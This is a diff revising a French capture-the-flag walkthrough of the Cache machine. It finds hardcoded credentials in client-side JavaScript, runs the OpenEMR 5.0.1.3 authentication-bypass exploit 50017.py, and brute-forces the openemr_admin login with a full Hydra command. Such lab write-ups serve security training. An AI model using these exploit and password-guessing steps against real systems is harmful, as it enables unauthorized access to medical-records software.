@@ -487,7 +487,7 @@ login.html
 
 La page `author.html` permet d’identifier le prénom de l’auteur du site : `Ash`
 
-Elle mentionne également explicitement une autre application réalisée par l’auteur, appelée : `HMS`
+Elle mentionne également une autre application réalisée par celui-ci, appelée `HMS`.
 
 
 
@@ -497,7 +497,7 @@ La page `login.html` contient une interface de connexion demandant un nom d’ut
 
 ![Page de connexion de l’application cache.htb](cache-htb-login-html.png)
 
-Une tentative avec des identifiants quelconques ne semble provoquer aucune requête d’authentification vers le serveur. Nous allons donc essayer de comprendre plus précisément le fonctionnement de cette interface.
+Une tentative avec des identifiants quelconques ne semble déclencher aucune requête d’authentification vers le serveur. Il faut donc examiner plus précisément le fonctionnement de cette interface.
 
 ### Analyse de la page `login.html`
 
@@ -515,7 +515,7 @@ En cliquant sur le lien `jquery/functionality.js` depuis le code source de la pa
 
 ![Recherche dans le fichier functionality.js](cache-htb-query-functionality-js-source.png)
 
-L’examen de `functionality.js` montre que la vérification des identifiants est réalisée directement dans le navigateur. 
+L’examen de `functionality.js` montre que la vérification des identifiants est entièrement réalisée dans le navigateur.
 
 Le code compare les valeurs saisies dans le formulaire à des identifiants inscrits en clair :
 
@@ -531,17 +531,21 @@ ssh ash@cache.htb
 
 Le mot de passe `H@v3_fun` n’est toutefois pas accepté. À ce stade, tu conserves néanmoins ces identifiants pour de futurs essais.
 
-Tu peux alors utiliser ces identifiants dans le formulaire de connexion. L’authentification réussit et redirige vers la page suivante :
+Tu les utilises ensuite dans le formulaire de connexion de `cache.htb`. L’authentification réussit et provoque une redirection vers une nouvelle page :
 
 ![Message « Welcome Back » affiché après la connexion à cache.htb](cache-htb-net-html_welcome-back.png)
 
 
 
-Cette page est encore en construction et ne fournit pas immédiatement de nouvelle fonctionnalité exploitable. Les identifiants découverts doivent néanmoins être conservés, car ils pourront correspondre à un autre service ou à un compte local présent sur la machine
+Cette page est encore en construction et ne fournit pas de nouvelle fonctionnalité immédiatement exploitable.
+
+Les identifiants découverts doivent néanmoins être conservés, car ils pourraient correspondre à un autre service ou à un compte local présent sur la machine.
 
 ### Identification du virtual host `hms.htb`
 
-La mention de l’application **HMS** laisse penser qu’une seconde application pourrait être hébergée sur la même machine. Comme le site principal utilise le nom `cache.htb`, tu peux raisonnablement tester le nom suivant :
+La mention de l’application `HMS` dans la page `author.html` laisse penser qu’une seconde application pourrait être hébergée sur la même machine.
+
+Comme le site principal utilise le nom `cache.htb`, tu peux raisonnablement tester le nom suivant :
 
 ```text
 hms.htb
@@ -553,13 +557,13 @@ Pour vérifier cette hypothèse, tu ajoutes ce nom dans le fichier `/etc/hosts` 
 10.129.x.x cache.htb hms.htb
 ```
 
-Tu peux ensuite ouvrir le nouveau virtual host dans le navigateur :
+Tu essaies alors d’ouvrir ce nouveau virtual host dans le navigateur :
 
 ```text
 http://hms.htb
 ```
 
-La page affichée correspond à une interface de connexion **OpenEMR**.
+L’hypothèse est confirmée : le nom `hms.htb` répond bien et affiche une interface de connexion OpenEMR.
 
 ![Page de connexion OpenEMR sur hms.htb](hms-htb-openemr-login.png)
 
@@ -569,7 +573,9 @@ Comme tu disposes déjà des identifiants découverts dans `functionality.js`, t
 ash:H@v3_fun
 ```
 
-La tentative échoue : ces identifiants ne permettent donc pas de se connecter à OpenEMR. 
+La tentative échoue. Ces identifiants ne permettent donc pas de se connecter à OpenEMR.
+
+L’existence du virtual host `hms.htb` est néanmoins confirmée. Tu peux maintenant poursuivre son énumération afin d’identifier plus précisément l’application et les ressources qu’elle expose.
 
 ### Énumération web de `hms.htb` avec `mon-recoweb`
 
@@ -579,7 +585,7 @@ Maintenant que l’existence du virtual host `hms.htb` est confirmée, tu peux p
 mon-recoweb hms.htb
 ```
 
-Cette étape te permet de rechercher les répertoires et fichiers accessibles sur le nouveau virtual host, tout en conservant les résultats dans un répertoire distinct de ceux de `cache.htb`.
+Le script recherche les répertoires et les fichiers accessibles sur ce nouveau virtual host. Les résultats sont enregistrés dans un répertoire propre à `hms.htb`, distinct de celui utilisé précédemment pour `cache.htb`.
 
 ```bash
 ===== mon-recoweb — RÉSUMÉ DES RÉSULTATS =====
@@ -762,7 +768,15 @@ http://hms.htb/version.php (CODE:200|SIZE:0)
 http://hms.htb/wp-forum.phps (CODE:403|SIZE:272)
 ```
 
-Parmi les ressources découvertes, la page suivante mérite une attention particulière :
+Parmi les ressources découvertes, plusieurs chemins correspondent à la structure classique d’une installation OpenEMR, comme `/interface/`, `/sites/`, `/portal/` ou `/modules/`.
+
+Le fichier `admin.php` retient toutefois particulièrement l’attention. Son nom suggère une interface d’administration et, contrairement à plusieurs ressources protégées par un code `403` ou redirigées, il répond directement avec un code HTTP `200` :
+
+```
+http://hms.htb/admin.php (CODE:200|SIZE:937)
+```
+
+Tu essaies donc de l’ouvrir dans le navigateur :
 
 ```html
 http://hms.htb/admin.php
@@ -770,7 +784,7 @@ http://hms.htb/admin.php
 
 
 
-En la consultant depuis le navigateur, tu obtiens l’interface **OpenEMR Site Administration**, qui révèle directement la version installée :
+La page est accessible sans authentification et affiche l’interface **OpenEMR Site Administration**. Elle révèle directement la version installée :
 
 ```text
 5.0.1 (3)
@@ -780,7 +794,7 @@ En la consultant depuis le navigateur, tu obtiens l’interface **OpenEMR Site A
 
 
 
-Cette information est particulièrement utile, car elle permet désormais de rechercher des vulnérabilités correspondant précisément à cette version d’OpenEMR.
+Cette information est particulièrement utile : tu connais désormais la version précise de l’application et peux rechercher les vulnérabilités qui lui correspondent.
 
 ### Recherche de vulnérabilités connues
 
@@ -811,7 +825,13 @@ Shellcodes: No Results
 
 ```
 
-Comme la cible utilise précisément la version `5.0.1.3`, tu vas privilégier les exploits écrits en Python, car ils sont généralement plus simples à lire, à tester et à adapter si une incompatibilité apparaît, ce qui te laisse les trois scripts suivants :
+La version affichée dans l’interface d’administration est `5.0.1 (3)`, ce qui correspond à la notation `5.0.1.3` utilisée dans les résultats de `searchsploit`.
+
+Tu peux donc écarter les exploits qui ciblent spécifiquement la version `5.0.1.7` et te concentrer en priorité sur ceux écrits pour `5.0.1.3`.
+
+Parmi ces résultats, tu privilégies les scripts Python, car ils sont plus simples à lire, à exécuter et, si nécessaire, à adapter. 
+
+Trois exploits retiennent ainsi l’attention :
 
 ```
 php/webapps/49998.py — OpenEMR 5.0.1.3 - 'manage_site_files' Remote Code Execution (Authenticated)
@@ -819,34 +839,34 @@ php/webapps/50017.py — OpenEMR 5.0.1.3 - Authentication Bypass
 php/webapps/45161.py — OpenEMR 5.0.1.3 - Remote Code Execution (Authenticated)
 ```
 
-Il est préférable de créer un sous-répertoire dédié afin de regrouper les exploits OpenEMR, puis d’y copier les trois scripts retenus :
+Les exploits `49998.py` et `45161.py` nécessitent des identifiants OpenEMR valides. À ce stade, tu ne disposes encore d’aucun compte permettant de t’authentifier sur l’application.
+
+L’exploit `50017.py` constitue donc la piste la plus logique à examiner en premier. Il cible un contournement de l’authentification du portail patient et pourrait permettre d’accéder à des informations utiles sur les comptes présents dans OpenEMR.
+
+### Exploitation du contournement d’authentification avec `50017.py`
+
+Tu commences par créer un sous-répertoire dédié à l’exploit, puis tu y copies le script avec `searchsploit` :
 
 ```bash
-mkdir hms
-cd hms
+mkdir -p hms/50017
+cd hms/50017
 
-searchsploit -m php/webapps/49998.py
 searchsploit -m php/webapps/50017.py
-searchsploit -m php/webapps/45161.py
 ```
 
+Avant de l’exécuter, tu affiches le code source de `50017.py` dans un éditeur de texte afin d’en examiner l’en-tête, les commentaires et les différentes requêtes envoyées à la cible :
 
+```bash
+nano 50017.py
+```
 
-Les exploits `49998.py` et `45161.py` nécessitent des identifiants OpenEMR valides. À ce stade, tu n’en possèdes pas encore.
+Cette lecture permet de comprendre le fonctionnement général de l’exploit, les pages qu’il tente de récupérer et les paramètres qu’il attend.
 
-L’exploit `50017.py` est donc la piste la plus logique à examiner en premier, puisqu’il te permet de contourner l’authentification du portail patient et pourrait te révéler des informations utiles sur les comptes présents dans l’application.
+Son en-tête décrit une vulnérabilité permettant à un utilisateur non authentifié de contourner l’authentification du portail patient.
 
+Le script indique qu’en accédant d’abord à la page d’inscription du portail, il devient ensuite possible de demander plusieurs pages normalement réservées à un patient authentifié.
 
-
-### Contournement de l’authentification du portail patient
-
-Tu commences par examiner le code source de l’exploit `50017.py`. 
-
-Son en-tête décrit une vulnérabilité permettant à un utilisateur non authentifié de contourner la connexion du portail patient. 
-
-Le script précise qu’en accédant d’abord à la page d’inscription du portail, il devient possible de demander plusieurs pages normalement réservées à un patient authentifié.
-
-Le commentaire présent dans le code source cite notamment les pages suivantes :
+Le commentaire placé au début du code source cite notamment les ressources suivantes :
 
 ```
 add_edit_event_user.php
@@ -866,18 +886,17 @@ report/portal_custom_report.php
 report/portal_patient_report.php
 ```
 
-L’objectif est donc de récupérer ces différentes pages, puis de les examiner à la recherche d’informations utiles, comme des comptes utilisateurs et, éventuellement, leurs identifiants.
+L’objectif est donc de récupérer ces différentes pages, puis d’examiner leur contenu à la recherche d’informations utiles, notamment des comptes présents dans l’application.
 
-Pour regrouper proprement les fichiers récupérés, tu crées un sous-répertoire dédié à cet exploit :
-
-```
-mkdir -p 50017
-```
-
-Avant de lancer l’exploitation, tu affiches l’aide du script afin d’identifier les paramètres attendus :
+Tu affiches d’abord l’aide du script afin d’identifier les paramètres attendus :
 
 ```bash
 python3 50017.py -h
+```
+
+La commande retourne :
+
+```bash
 usage: 50017.py [-h] [-T IP] [-P PORT] [-U OPENEMRPATH] [-R PATHTOGET]
 
 OpenEMR Authentication bypass
@@ -897,7 +916,7 @@ Le script attend donc :
 - le chemin de base de l’installation OpenEMR avec `-U` ;
 - la ressource à récupérer avec `-R`.
 
-Le commentaire du script précise que les fichiers cités sont des *pages in the portal directory*. Comme le portail patient est accessible sous `/portal/`, tu construis leur chemin complet en les préfixant par ce répertoire.
+Le commentaire du script précise que les fichiers cités correspondent à des pages situées dans le répertoire du portail. Comme celui-ci est accessible sous `/portal/`, tu construis leur chemin complet en les préfixant par ce répertoire.
 
 Pour vérifier le fonctionnement du contournement, tu commences par la première page de la liste :
 
@@ -949,7 +968,7 @@ Dans la réponse, une information mérite déjà d’être relevée :
 </td>
 ```
 
-Cette valeur apparaît dans le champ **Provider** du formulaire de rendez-vous. Elle indique la présence d’un compte administrateur dans OpenEMR, sans encore révéler son nom d’utilisateur ni ses identifiants.
+Cette valeur apparaît dans le champ **Provider** du formulaire de rendez-vous. Elle révèle la présence d’un compte administrateur dans OpenEMR, sans encore fournir son nom d’utilisateur ni son mot de passe.
 
 Le premier test ayant confirmé le fonctionnement du contournement, tu peux maintenant automatiser la récupération des autres pages mentionnées dans le code source de l’exploit.
 
@@ -1008,6 +1027,11 @@ Une fois toutes les pages récupérées, tu recherches les occurrences du terme 
 
 ```bash
 grep -Rni 'administrator' 50017/
+```
+
+La commande retourne :
+
+```bash
 50017/messaging_messages.txt:67:    $scope.authrecips = [{"userid":"openemr_admin","username":"Administrator Administrator"}];
 50017/add_edit_event_user.txt:86:    <option value='1'>Administrator, Administrator</option>
 ```
@@ -1024,22 +1048,47 @@ Tu disposes désormais d’un nom d’utilisateur OpenEMR valide. En revanche, l
 
 La prochaine étape consiste donc à analyser précisément le formulaire de connexion d’OpenEMR afin de préparer une recherche du mot de passe de `openemr_admin`.
 
-### Identification des paramètres Hydra avec Burp Suite
+### Recherche du mot de passe de `openemr_admin`
 
-Pour trouver le mot de passe du compte `openemr_admin`, tu vas utiliser **Hydra** afin de tester automatiquement une liste de mots de passe sur le formulaire de connexion d’OpenEMR.
+Tu disposes désormais d’un nom d’utilisateur OpenEMR valide :
 
-Pour une présentation plus générale de l’outil et de son utilisation avec les formulaires HTTP `POST`, tu peux consulter ce tutoriel en français [Hydra Cheat Sheet](https://hackops.fr/hydra-cheat-sheet/).
+```text
+openemr_admin
+```
 
-Hydra doit connaître :
+La prochaine étape consiste à rechercher le mot de passe associé à ce compte.
 
-- le nom d’utilisateur ;
-- la liste de mots de passe à tester ;
-- la cible ;
+Pour cela, tu vas utiliser **Hydra**, qui permet de tester automatiquement une liste de mots de passe sur un formulaire de connexion HTTP.
+
+Pour une présentation plus générale de l’outil et de son utilisation avec les formulaires HTTP `POST`, tu peux consulter ce tutoriel en français : [Hydra Cheat Sheet](https://hackops.fr/hydra-cheat-sheet/).
+
+Avant de construire la commande Hydra, tu dois toutefois identifier précisément le fonctionnement du formulaire d’authentification d’OpenEMR :
+
 - l’URL vers laquelle les identifiants sont envoyés ;
-- les champs transmis dans la requête ;
-- un marqueur permettant de reconnaître un échec d’authentification.
+- les paramètres transmis dans la requête ;
+- le champ contenant le nom d’utilisateur ;
+- le champ contenant le mot de passe ;
+- un élément permettant de reconnaître un échec d’authentification.
 
-Pour récupérer tous ces éléments, tu interceptes une tentative de connexion avec Burp Suite en utilisant le compte `openemr_admin` et un mot de passe volontairement incorrect, puis tu envoies la requête dans **Repeater**.
+Tu vas utiliser **Burp Suite** pour intercepter une tentative de connexion et récupérer ces différents éléments.
+
+#### Identification des paramètres avec Burp Suite
+
+Tu ouvres Burp Suite et configures le navigateur afin que ses requêtes passent par le proxy.
+
+Sur la page de connexion d’OpenEMR, tu saisis le nom d’utilisateur connu :
+
+```text
+openemr_admin
+```
+
+Tu utilises ensuite un mot de passe volontairement incorrect, par exemple :
+
+```text
+test
+```
+
+Tu interceptes la tentative de connexion dans Burp Suite, puis tu envoies la requête dans **Repeater** afin de pouvoir l’examiner plus facilement.
 
 ![Tentative de connexion OpenEMR avec un mauvais mot de passe dans Burp Suite](hms-htb-loginbad-password-burp-suite.png)
 
@@ -1057,7 +1106,21 @@ Son corps contient les paramètres suivants :
 new_login_session_management=1&authProvider=Default&languageChoice=1&authUser=openemr_admin&clearPass=test
 ```
 
-Le nom d’utilisateur étant déjà connu, seule la valeur de `clearPass` devra varier pendant l’attaque Hydra :
+Le nom d’utilisateur est envoyé dans le paramètre :
+
+```
+authUser
+```
+
+Le mot de passe est envoyé dans :
+
+```
+clearPass
+```
+
+Comme le nom d’utilisateur `openemr_admin` est déjà connu, seule la valeur du paramètre `clearPass` devra varier pendant l’attaque.
+
+Dans la commande Hydra, cette valeur sera remplacée par le marqueur suivant :
 
 ```bash
 clearPass=^PASS^
@@ -1069,23 +1132,23 @@ La partie correspondant aux données du formulaire devient donc :
 new_login_session_management=1&authProvider=Default&languageChoice=1&authUser=openemr_admin&clearPass=^PASS^
 ```
 
+Il reste maintenant à déterminer comment Hydra pourra reconnaître un échec d’authentification.
+
 La réponse à cette tentative incorrecte contient l’instruction JavaScript suivante :
 
 ```bash
 w.top.location.href = '/interface/login_screen.php?error=1&site=';
 ```
 
-Le texte `error=1` est donc un marqueur fiable d’échec d’authentification. La condition à utiliser avec Hydra sera :
+Le texte `error=1` apparaît donc dans la réponse lorsque l’authentification échoue.
+
+Tu peux l’utiliser comme marqueur d’échec dans Hydra :
 
 ```
 F=error=1
 ```
 
-
-
-### Attaque par dictionnaire avec Hydra
-
-Les éléments nécessaires à la construction de la commande Hydra sont maintenant connus :
+Tu disposes maintenant de tous les éléments nécessaires à la construction de la commande Hydra :
 
 ```text
 Utilisateur        : openemr_admin
@@ -1097,9 +1160,15 @@ Champ mot de passe : clearPass
 Marqueur d’échec   : error=1
 ```
 
+### Attaque par dictionnaire avec Hydra
 
+Avant de préparer l’attaque par dictionnaire, tu reviens donc dans le répertoire de travail `hms` :
 
-Avant d’utiliser une wordlist volumineuse, il est préférable de vérifier la commande avec une courte liste de mots de passe :
+```
+cd ..
+```
+
+Tu crées ensuite un sous-répertoire dédié à Hydra, puis un fichier contenant quelques mots de passe de test :
 
 ```bash
 mkdir -p hydra
@@ -1112,18 +1181,26 @@ H@v3_fun
 EOF
 ```
 
+L’arborescence de travail contient désormais deux répertoires distincts :
+
+```text
+hms/
+├── 50017/
+└── hydra/
+```
+
 Cette première liste ne vise pas encore à trouver le mot de passe. Elle permet surtout de confirmer que Hydra reproduit correctement la requête observée dans Burp Suite et interprète correctement le marqueur d’échec.
 
 Tu lances le test avec :
 
 ```bash
 hydra -l openemr_admin \
-  -P hydra/test-passwords.txt \
-  hms.htb \
-  http-post-form \
-  '/interface/main/main_screen.php?auth=login&site=default:new_login_session_management=1&authProvider=Default&languageChoice=1&authUser=openemr_admin&clearPass=^PASS^:F=error=1' \
-  -t 1 \
-  -V
+-P hydra/test-passwords.txt \
+hms.htb \
+http-post-form \
+'/interface/main/main_screen.php?auth=login&site=default:new_login_session_management=1&authProvider=Default&languageChoice=1&authUser=openemr_admin&clearPass=^PASS^:F=error=1' \
+-t 1 \
+-V
 ```
 
 L’option `-l` précise le nom d’utilisateur déjà connu, tandis que `-P` indique le fichier contenant les mots de passe à tester.
@@ -1173,9 +1250,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at [date]
 
 ```
 
-Comme la petite wordlist ne contient pas a priori le mot de passe recherché, Hydra traite correctement chacune de ses entrées comme un échec. 
-
-La syntaxe de la commande et le marqueur `F=error=1` sont donc validés.
+Les quatre mots de passe sont correctement traités comme des échecs. La syntaxe de la commande et le marqueur `F=error=1` sont donc validés.
 
 Tu peux maintenant préparer une liste plus importante en extrayant les 10 000 premiers mots de passe de RockYou :
 
@@ -1183,6 +1258,8 @@ Tu peux maintenant préparer une liste plus importante en extrayant les 10 000 p
 head -n 10000 /usr/share/wordlists/rockyou.txt \
   > hydra/rockyou-10000.txt
 ```
+
+Cette limitation permet d’éviter de lancer immédiatement une attaque sur l’intégralité de la wordlist, alors que le mot de passe recherché peut se trouver parmi les entrées les plus courantes.
 
 Tu relances ensuite Hydra avec cette nouvelle liste :
 
@@ -1198,7 +1275,13 @@ hydra -l openemr_admin \
 
 L’attaque peut prendre plusieurs minutes, notamment selon la vitesse de réponse du serveur et la position du mot de passe dans la liste. 
 
-Hydra finit par identifier un mot de passe valide pour le compte :
+Hydra teste successivement les mots de passe de la liste et finit par identifier une combinaison valide :
+
+```text
+[80][http-post-form] host: hms.htb   login: openemr_admin   password: xxxxxx
+```
+
+Tu disposes désormais des identifiants suivants :
 
 ```text
 openemr_admin:xxxxxx
